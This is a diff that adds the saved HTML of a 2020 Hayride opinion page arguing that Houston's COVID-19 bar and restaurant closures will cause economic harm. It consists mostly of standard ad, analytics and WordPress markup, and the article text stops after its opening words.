@@ -1,0 +1,919 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="https://gmpg.org/xfn/11">
+<link rel="icon" type="image/png" href="" />
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-98250005-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-98250005-1');
+</script>
+<script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script>
+
+<script>
+// get url query params - added by gw 2021-1-14
+	var match,
+		pl = /\+/g,
+		search = /([^&=]+)=?([^&]*)/g,
+		decode = function (s) {
+			return decodeURIComponent(s.replace(pl, " "));
+		},
+		query = window.location.search.substring(1);
+
+	// collect params as arrays
+	var urlParams = {};
+	while (match = search.exec(query)) {
+		urlParams[decode(match[1])] = decode(match[2]);
+	}
+
+	// test ad free auth
+	if(urlParams._dm && urlParams._dm.length > 16) {
+		document.cookie = `dm_auth=${urlParams._dm}; max-age= ${(30*24*60*60)}; path=/`;
+	}
+
+	function extractCookies() {
+		var output = {};
+		if(!document.cookie) return output;
+		 document.cookie.split(/\s*;\s*/).forEach(function(pair) {
+			pair = pair.split(/\s*=\s*/);
+			output[pair[0]] = pair.splice(1).join('=');
+		});
+		return output;
+	}
+    
+	function checkUDM() {
+		let cookie = extractCookies();
+		// let result = urlParams._dm || cookie.dm_auth || false;
+		// console.log('_dm test', result, cookie.dm_auth);
+		return urlParams._dm || cookie.dm_auth || false;
+	}
+
+</script>
+
+<!--AD SCRIPTS FROM ADMIN-->
+<!-- <script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script> -->
+<script>
+if(!checkUDM())  {
+
+  var googletag = googletag || {};
+  googletag.cmd = googletag.cmd || [];
+
+  // Create Ad Slots
+  googletag.cmd.push(function() {
+      
+    // Start Header Mapping
+    var headermapping = googletag.sizeMapping().
+    // Add Size - Small
+    addSize([0,0], [[300,250]]).
+    // Add Size - Medium
+    addSize([787,100], [[300,250],[728,90]]).
+    // Add Size - Large
+    addSize([1020,100], [[728,90],[970,250]]).
+    build();
+      
+    googletag.defineSlot('/1194830/Nhayride970_header', [[300,250],[728,90],[970,250]],  'wpdev-responsive-header').defineSizeMapping(headermapping).setCollapseEmptyDiv(true).addService(googletag.pubads());
+    googletag.defineSlot('/1194830/Nhayride_sidebar_Top', [[336, 280], [300, 250], [300, 600]], 'wpdev-sidebar-top').setCollapseEmptyDiv(true).addService(googletag.pubads());
+    googletag.defineSlot('/1194830/Nhayride_in_content_1', [[300, 250], [336, 280]], 'wpdev-inline-top').setCollapseEmptyDiv(true).addService(googletag.pubads());
+  	 googletag.defineSlot('/1194830/Nhayride_sidebar_BTF', [[300, 600], [160, 600], [336, 280]], 'wpdev-sidebar-bottom').setCollapseEmptyDiv(true).addService(googletag.pubads());
+	 googletag.defineSlot('/1194830/Nhayride_in_content_2', [[336, 280], [500, 300]], 'wpdev-inline-bottom').setCollapseEmptyDiv(true).addService(googletag.pubads());
+
+    googletag.pubads().enableSingleRequest();
+    googletag.pubads().disableInitialLoad();
+    googletag.enableServices();
+  });
+}
+</script>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-Y1EPFXRFET"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-Y1EPFXRFET');
+</script><script>
+if (!checkUDM()) {
+	//load the apstag.js library
+	! function(a9, a, p, s, t, A, g) {
+		if (a[a9]) return;
+
+		function q(c, r) {
+			a[a9]._Q.push([c, r])
+		}
+		a[a9] = {
+			init: function() {
+				q("i", arguments)
+			},
+			fetchBids: function() {
+				q("f", arguments)
+			},
+			setDisplayBids: function() {},
+			targetingKeys: function() {
+				return []
+			},
+			_Q: []
+		};
+		A = p.createElement(s);
+		A.async = !0;
+		A.src = t;
+		g = p.getElementsByTagName(s)[0];
+		g.parentNode.insertBefore(A, g)
+	}("apstag", window, document, "script", "//c.amazon-adsystem.com/aax2/apstag.js");
+
+	//initialize the apstag.js library on the page to allow bidding
+	apstag.init({
+		pubID: '43b773e9-a6f6-49e5-9900-1f86f2033ad0', //enter your pub ID here as shown above, it must within quotes
+		adServer: 'googletag'
+	});
+	apstag.fetchBids({
+		slots: [{
+
+				slotID: 'wpdev-responsive-header', //example: 'div-gpt-ad-1475185990716-0'
+				slotName: '/1194830/Nhayride970_header', //example: '12345/leaderboard-1'
+				sizes: [
+					[300, 250],
+					[728, 90],
+					[970, 250]
+				] //example: [[728,90]]
+			},
+			{
+				slotID: 'wpdev-sidebar-top', //example: 'div-gpt-ad-1475185990716-0'
+				slotName: '/1194830/Nhayride_sidebar_Top', //example: '12345/leaderboard-1'
+				sizes: [
+					[336, 280],
+					[300, 250],
+					[300, 600]
+				] //example: [[728,90]]
+			},
+			{
+				slotID: 'wpdev-inline-top', //example: 'div-gpt-ad-1475185990716-0'
+				slotName: '1194830/Nhayride_in_content_1', //example: '12345/leaderboard-1'
+				sizes: [
+					[336, 280],
+					[300, 250],
+					[300, 600]
+				] //example: [[728,90]]
+			},
+			{
+				slotID: 'wpdev-sidebar-bottom', //example: 'div-gpt-ad-1475185990716-0'
+				slotName: '/1194830/Nhayride_sidebar_BTF', //example: '12345/leaderboard-1'
+				sizes: [
+					[300, 600],
+					[160, 600],
+					[336, 280]
+				] //example: [[728,90]]
+			},
+			{
+				slotID: 'wpdev-inline-bottom', //example: 'div-gpt-ad-1475185990716-0'
+				slotName: '/1194830/Nhayride_in_content_2', //example: '12345/leaderboard-1'
+				sizes: [336, 280] //example: [[728,90]]
+
+
+
+			}
+		],
+		timeout: 2e3
+	}, function(bids) {
+		// set apstag targeting on googletag, then trigger the first DFP request in googletag's disableInitialLoad integration
+		googletag.cmd.push(function() {
+			apstag.setDisplayBids();
+			googletag.pubads().refresh();
+		});
+	});
+
+
+	// BEGIN 33Across SiteCTRL Script 
+
+	if (document.location.protocol == 'http:') {
+		var Tynt = Tynt || [];
+		Tynt.push('a8dWwwaLCr5QO5rkHcnnVW');
+		if (!checkUDM()) {
+			(function() {
+				var h, s = document.createElement('script');
+				s.src = '//cdn.tynt.com/ti.js';
+				h = document.getElementsByTagName('script')[0];
+				h.parentNode.insertBefore(s, h);
+			})();
+		}
+	}
+	// END 33Across SiteCTRL Script 
+
+	document.write(
+		'<script data-cfasync="false" language="javascript" async src="//udmserve.net/udm/img.fetch?sid=15379;tid=1;dt=8;"><\/script>'
+		);
+	// UNDERDOGMEDIA InPage_staging.generous-doohickey.flywheelsites.com ADCODE END --->
+	// UNDERDOGMEDIA EDGE_staging.generous-doohickey.flywheelsites.com JavaScript ADCODE START--->
+	document.write(
+		'<script data-cfasync="false" language="javascript" async src="https://udmserve.net/udm/img.fetch?sid=15350;tid=1;dt=6;"><\/script>'
+		);
+	// UNDERDOGMEDIA EDGE_staging.generous-doohickey.flywheelsites.com JavaScript ADCODE END--->
+
+	! function(n) {
+		if (!window.cnx) {
+			window.cnx = {}, window.cnx.cmd = [];
+			var t = n.createElement('iframe');
+			t.display = 'none', t.onload = function() {
+				var n = t.contentWindow.document,
+					c = n.createElement('script');
+				c.src = '//cd.connatix.com/connatix.player.js', c.setAttribute('async', '1'), c.setAttribute('type',
+					'text/javascript'), n.body.appendChild(c)
+			}, n.head.appendChild(t)
+		}
+	}(document);
+}
+</script>
+
+
+
+	<!-- This site is optimized with the Yoast SEO plugin v18.3 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>COVID-19 Forced Closures in Houston Will Lead To Economic Disaster</title>
+	<meta name="description" content="While Texas Gov. Greg Abbott decided not to close bars and restaurants Houston did, and the damage that decision will cause could be worse than the virus." />
+	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="COVID-19 Forced Closures in Houston Will Lead To Economic Disaster" />
+	<meta property="og:description" content="While Texas Gov. Greg Abbott decided not to close bars and restaurants Houston did, and the damage that decision will cause could be worse than the virus." />
+	<meta property="og:url" content="https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/" />
+	<meta property="og:site_name" content="The Hayride" />
+	<meta property="article:publisher" content="https://www.facebook.com/TheHayride/" />
+	<meta property="article:published_time" content="2020-03-17T08:00:59+00:00" />
+	<meta property="article:modified_time" content="2020-03-17T14:15:40+00:00" />
+	<meta property="og:image" content="https://thehayride.com/wp-content/uploads/2020/03/restaurant-closed.jpg" />
+	<meta property="og:image:width" content="1200" />
+	<meta property="og:image:height" content="600" />
+	<meta property="og:image:type" content="image/jpeg" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:creator" content="@TheHayride" />
+	<meta name="twitter:site" content="@TheHayride" />
+	<meta name="twitter:label1" content="Written by" />
+	<meta name="twitter:data1" content="Leland Freeman" />
+	<meta name="twitter:label2" content="Est. reading time" />
+	<meta name="twitter:data2" content="3 minutes" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://thehayride.com/#website","url":"https://thehayride.com/","name":"The Hayride","description":"Southern Politics &amp; Culture","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://thehayride.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/#primaryimage","inLanguage":"en-US","url":"https://thehayride.com/wp-content/uploads/2020/03/restaurant-closed.jpg","contentUrl":"https://thehayride.com/wp-content/uploads/2020/03/restaurant-closed.jpg","width":1200,"height":600},{"@type":"WebPage","@id":"https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/#webpage","url":"https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/","name":"COVID-19 Forced Closures in Houston Will Lead To Economic Disaster","isPartOf":{"@id":"https://thehayride.com/#website"},"primaryImageOfPage":{"@id":"https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/#primaryimage"},"datePublished":"2020-03-17T08:00:59+00:00","dateModified":"2020-03-17T14:15:40+00:00","author":{"@id":"https://thehayride.com/#/schema/person/2e16bff05e47aa3b91501715623314d5"},"description":"While Texas Gov. Greg Abbott decided not to close bars and restaurants Houston did, and the damage that decision will cause could be worse than the virus.","breadcrumb":{"@id":"https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/"]}]},{"@type":"BreadcrumbList","@id":"https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://thehayride.com/"},{"@type":"ListItem","position":2,"name":"COVID-19 Forced Closures in Houston Will Lead To Economic Disaster"}]},{"@type":"Person","@id":"https://thehayride.com/#/schema/person/2e16bff05e47aa3b91501715623314d5","name":"Leland Freeman","image":{"@type":"ImageObject","@id":"https://thehayride.com/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/0a93af14ef87aaa422da004a15a0a7f0?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/0a93af14ef87aaa422da004a15a0a7f0?s=96&d=mm&r=g","caption":"Leland Freeman"},"sameAs":["http://thehayride.com"],"url":"https://thehayride.com/author/leland-freeman/"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//use.fontawesome.com' />
+<link rel='dns-prefetch' href='//npmcdn.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="The Hayride &raquo; Feed" href="https://thehayride.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="The Hayride &raquo; Comments Feed" href="https://thehayride.com/comments/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thehayride.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.6.10"}};
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='https://thehayride.com/wp-includes/css/dist/block-library/style.min.css?ver=5.6.10' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-css'  href='https://thehayride.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
+<link rel='stylesheet' id='ride-google-font-css'  href='//fonts.googleapis.com/css?family=Lato%3A400%2C700%7CRubik%3A300%2C500%2C700&#038;ver=5.6.10' type='text/css' media='all' />
+<link rel='stylesheet' id='the-ride-style-css'  href='https://thehayride.com/wp-content/themes/the-ride/style.css?ver=5.6.10' type='text/css' media='all' />
+<link rel='stylesheet' id='subscribe-forms-css-css'  href='https://thehayride.com/wp-content/plugins/easy-social-share-buttons3/assets/modules/subscribe-forms.min.css?ver=5.6.10' type='text/css' media='all' />
+<link rel='stylesheet' id='easy-social-share-buttons-css'  href='https://thehayride.com/wp-content/plugins/easy-social-share-buttons3/assets/css/easy-social-share-buttons.min.css?ver=5.6.10' type='text/css' media='all' />
+<script type='text/javascript' src='https://thehayride.com/wp-includes/js/jquery/jquery.min.js?ver=3.5.1' id='jquery-core-js'></script>
+<script type='text/javascript' src='https://thehayride.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
+<script type='text/javascript' src='//use.fontawesome.com/8cf3076674.js?ver=1.0' id='the-ride-fontawesome-js-js'></script>
+<script type='text/javascript' src='https://thehayride.com/wp-content/themes/the-ride/js/theride-top.js?ver=1.0' id='the-ride-top-js-js'></script>
+<link rel="https://api.w.org/" href="https://thehayride.com/wp-json/" /><link rel="alternate" type="application/json" href="https://thehayride.com/wp-json/wp/v2/posts/126748" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thehayride.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://thehayride.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.6.10" />
+<link rel='shortlink' href='https://thehayride.com/?p=126748' />
+<link rel="alternate" type="application/json+oembed" href="https://thehayride.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthehayride.com%2F2020%2F03%2Fcovid-19-forced-closures-in-houston-will-lead-to-economic-disaster%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://thehayride.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthehayride.com%2F2020%2F03%2Fcovid-19-forced-closures-in-houston-will-lead-to-economic-disaster%2F&#038;format=xml" />
+			<meta property="fb:pages" content="185465169674" />
+			<!-- Stream WordPress user activity plugin v3.9.0 -->
+
+<script type="text/javascript">var essb_settings = {"ajax_url":"https:\/\/thehayride.com\/wp-admin\/admin-ajax.php","essb3_nonce":"e6fcd8651c","essb3_plugin_url":"https:\/\/thehayride.com\/wp-content\/plugins\/easy-social-share-buttons3","essb3_stats":false,"essb3_ga":false,"essb3_ga_ntg":false,"blog_url":"https:\/\/thehayride.com\/","post_id":"126748","stop_postcount":true};</script>		<style type="text/css" id="wp-custom-css">
+			/* WC checkout form patch */
+#customer_details div.col-1, #customer_details div.col-2 {
+    -webkit-box-flex: 0 !important;
+    -webkit-flex: 0 0 100% !important;
+    -ms-flex: 0 0 100%  !important;
+    flex: 0 0 100% !important;
+    max-width: 100%  !important;
+}#customer_details div.col-1 {
+    -webkit-box-flex: 0 !important;
+    -webkit-flex: 0 0 100% !important;
+    -ms-flex: 0 0 100%  !important;
+    flex: 0 0 100% !important;
+    max-width: 100%  !important;
+}		</style>
+		</head>
+<body class="post-template-default single single-post postid-126748 single-format-standard wp-custom-logo group-blog essb-8.2">
+<!-- Modal -->
+<div class="modal fade wpdev-search-modal" id="wpdevSearch" tabindex="-1" role="dialog" aria-labelledby="wpdevSearch">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+        <button type="button" class="close wpdev-close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+        <form role="search" method="get" class="search-form" action="https://thehayride.com/">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
+				</label>
+				<input type="submit" class="search-submit" value="Search" />
+			</form>    </div>
+  </div>
+</div><div id="page" class="site">
+
+    <div class="wpdev-top-menu-cont">
+        <div class="container-fluid wpdev-top-menu wpdev-max-width">
+            <div class="row">
+                <div class="col-sm-9">
+                    <div class="menu-top-nav-container"><ul id="top-menu" class="menu"><li id="menu-item-114200" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-114200"><a href="https://thehayride.com/events/">Events</a></li>
+<li id="menu-item-73448" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-73448"><a href="https://thehayride.com/about/">About</a></li>
+<li id="menu-item-73449" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-73449"><a href="https://thehayride.com/subscribe-by-e-mail/">The Nooner</a></li>
+<li id="menu-item-73451" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-73451"><a href="https://thehayride.com/advertise/">Advertise</a></li>
+<li id="menu-item-73452" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-73452"><a href="https://thehayride.com/tip-us-off/">Tips</a></li>
+<li id="menu-item-131850" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-131850"><a href="https://thespeakeasy.disciplemedia.com/groups">The Speakeasy App</a></li>
+</ul></div>                </div>
+                <div class="col-sm-3">
+                    <div class="wpdev-social-networks">
+    <a href="https://www.facebook.com/TheHayride/" target="_blank"><i class="fa fa-facebook"></i></a>
+    <a href="https://twitter.com/TheHayride" target="_blank"><i class="fa fa-twitter"></i></a>
+    <button type="button" class="wpdev-search-btn" data-toggle="modal" data-target="#wpdevSearch">
+      <i class="fa fa-search"></i>
+    </button>
+</div>                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="wpdev-site-content-cont">
+        <div class="container-fluid wpdev-site wpdev-max-width">
+            <header id="masthead" class="site-header" role="banner">
+                <div class="site-branding">
+                    <a href="https://thehayride.com">
+                        <img src="https://thehayride.com/wp-content/uploads/2022/07/thehayride_logo_web.png" alt="The Hayride" />
+                    </a>
+                </div><!-- .site-branding -->
+
+                <nav id="site-navigation" class="main-navigation" role="navigation">
+                    <button class="menu-btn wpdev-push-btn"><i class="fa fa-bars"></i> Menu</button>
+                    <div class="menu-main-nav-container"><ul id="main-menu" class="menu"><li id="menu-item-73442" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-73442"><a href="https://thehayride.com/category/national/">National</a></li>
+<li id="menu-item-73441" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-73441"><a href="https://thehayride.com/category/elections/">Politics &#038; Elections</a></li>
+<li id="menu-item-73446" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-73446"><a href="https://thehayride.com/category/energy-national/">Business &#038; Energy</a></li>
+<li id="menu-item-73443" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-73443"><a href="https://thehayride.com/category/lagniappe/">Life &#038; Culture</a></li>
+<li id="menu-item-73444" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-73444"><a href="https://thehayride.com/category/government/">Government &#038; Policy</a></li>
+</ul></div>                    <div id="wpdev-region-nav">
+                        <div class="row wpdev-region-row">
+                            <div class="col-md-3 wpdev-drop-menu">
+                                <div class="menu-main-nav-container"><ul id="drop-menu" class="menu"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-73442"><a href="https://thehayride.com/category/national/">National</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-73441"><a href="https://thehayride.com/category/elections/">Politics &#038; Elections</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-73446"><a href="https://thehayride.com/category/energy-national/">Business &#038; Energy</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-73443"><a href="https://thehayride.com/category/lagniappe/">Life &#038; Culture</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-73444"><a href="https://thehayride.com/category/government/">Government &#038; Policy</a></li>
+</ul></div>                            </div>
+                            <div class="col-md-9 wpdev-drop-menu-regions">
+                                <h1 class="wpdev-section-title">News Regions</h1>
+                                <div class="menu-region-menu-container"><ul id="region-menu" class="menu"><li id="menu-item-105224" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105224"><a href="https://thehayride.com/category/alabama/">Alabama</a></li>
+<li id="menu-item-105225" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105225"><a href="https://thehayride.com/category/arkansas/">Arkansas</a></li>
+<li id="menu-item-105226" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105226"><a href="https://thehayride.com/category/florida/">Florida</a></li>
+<li id="menu-item-105227" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105227"><a href="https://thehayride.com/category/georgia/">Georgia</a></li>
+<li id="menu-item-105228" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105228"><a href="https://thehayride.com/category/kentucky/">Kentucky</a></li>
+<li id="menu-item-105229" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105229"><a href="https://thehayride.com/category/louisiana/">Louisiana</a></li>
+<li id="menu-item-105230" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105230"><a href="https://thehayride.com/category/mississippi/">Mississippi</a></li>
+<li id="menu-item-105231" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105231"><a href="https://thehayride.com/category/north-carolina/">North Carolina</a></li>
+<li id="menu-item-105232" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105232"><a href="https://thehayride.com/category/oklahoma/">Oklahoma</a></li>
+<li id="menu-item-105233" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105233"><a href="https://thehayride.com/category/south-carolina/">South Carolina</a></li>
+<li id="menu-item-105234" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105234"><a href="https://thehayride.com/category/tennessee/">Tennessee</a></li>
+<li id="menu-item-105235" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-105235"><a href="https://thehayride.com/category/texas/">Texas</a></li>
+<li id="menu-item-105236" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-105236"><a href="https://thehayride.com/category/virginia/">Virginia</a></li>
+</ul></div>                            </div>
+                        </div>
+                    </div>
+                </nav><!-- #site-navigation -->
+            </header><!-- #masthead -->
+
+            <!-- Main Post -->
+            
+            <!-- Ad Location -->
+            <div class="wpdev-ads wpdev-header">
+	<div id="wpdev-responsive-header">
+		<script>
+		if (!checkUDM()) {
+			googletag.cmd.push(function() {
+				googletag.display('wpdev-responsive-header');
+			});
+		}
+		</script>
+	</div>
+</div>
+
+            <div id="content" class="site-content row">
+                                    <div class="col-sm-12 wpdev-single-featured-image">
+                        <img src="https://thehayride.com/wp-content/uploads/2020/03/restaurant-closed-800x400.jpg" width="800" height="400" alt="COVID-19 Forced Closures in Houston Will Lead To Economic Disaster" />
+                    </div>
+                                <div class="col-sm-8 wpdev-site-content wpdev-site-single">
+
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+
+		<article id="post-126748" class="post-126748 post type-post status-publish format-standard has-post-thumbnail hentry category-government category-texas tag-airline-industry tag-forced-bar-closures tag-forced-restaurant-closures tag-governor-greg-abbott tag-harris-county tag-houston">
+	<header class="entry-header">
+        <h1 class="entry-title">COVID-19 Forced Closures in Houston Will Lead To Economic Disaster</h1>
+		<div class="entry-meta">
+			<div class="wpdev-post-meta wpdev-main-post-meta wpdev-side-post-meta">
+                <span class="wpdev-post-meta-date wpdev-main-post-date wpdev-side-post-date">March 17th, 2020</span>
+                <span class="wpdev-post-meta-author wpdev-main-post-author wpdev-side-post-author"><a href="https://thehayride.com/author/leland-freeman/">Leland Freeman</a></span>
+            </div>
+		</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<!--<span class="total-shares">92</span>-->        <div class="essb_links essb_counters essb_displayed_shortcode essb_share essb_template_metro-bold-retina essb_120354335 essb_width_flex essb_links_center print-no" id="essb_displayed_shortcode_120354335" data-essb-postid="126748" data-essb-position="shortcode" data-essb-button-style="button" data-essb-template="metro-bold-retina" data-essb-counter-pos="hidden" data-essb-url="https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/" data-essb-fullurl="https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/" data-essb-instance="120354335"><ul class="essb_links_list"><li class="essb_item essb_link_facebook nolightbox"> <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fthehayride.com%2F2020%2F03%2Fcovid-19-forced-closures-in-houston-will-lead-to-economic-disaster%2F&t=COVID-19+Forced+Closures+in+Houston+Will+Lead+To+Economic+Disaster" title="Share on Facebook" onclick="essb.window(&#39;https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fthehayride.com%2F2020%2F03%2Fcovid-19-forced-closures-in-houston-will-lead-to-economic-disaster%2F&t=COVID-19+Forced+Closures+in+Houston+Will+Lead+To+Economic+Disaster&#39;,&#39;facebook&#39;,&#39;120354335&#39;); return false;" target="_blank" rel="nofollow" class="nolightbox" ><span class="essb_icon essb_icon_facebook"></span><span class="essb_network_name">Facebook</span></a><span class="essb_counter_hidden" data-cnt="92" data-cnt-short=""></span></li><li class="essb_item essb_link_twitter nolightbox"> <a href="#" title="Share on Twitter" onclick="essb.window(&#39;https://twitter.com/intent/tweet?text=COVID-19%20Forced%20Closures%20in%20Houston%20Will%20Lead%20To%20Economic%20Disaster&amp;url=https%3A%2F%2Fthehayride.com%2F2020%2F03%2Fcovid-19-forced-closures-in-houston-will-lead-to-economic-disaster%2F&amp;counturl=https%3A%2F%2Fthehayride.com%2F2020%2F03%2Fcovid-19-forced-closures-in-houston-will-lead-to-economic-disaster%2F&amp;related=TheHayride&amp;via=TheHayride&#39;,&#39;twitter&#39;,&#39;120354335&#39;); return false;" target="_blank" rel="nofollow" class="nolightbox" ><span class="essb_icon essb_icon_twitter"></span><span class="essb_network_name">Twitter</span></a></li><li class="essb_item essb_totalcount_item" data-counter-pos="hidden"><span class="essb_totalcount essb_t_r_big essb_total_icon essb_icon_share-tiny" title="" data-shares-text="shares"><span class="essb_t_nb">92<span class="essb_t_nb_after">shares</span></span></span></li></ul></div>		<p><p>Governor Greg Abbott made a conscious decision to not order restaurants and bars closed in the state of Texas like <a 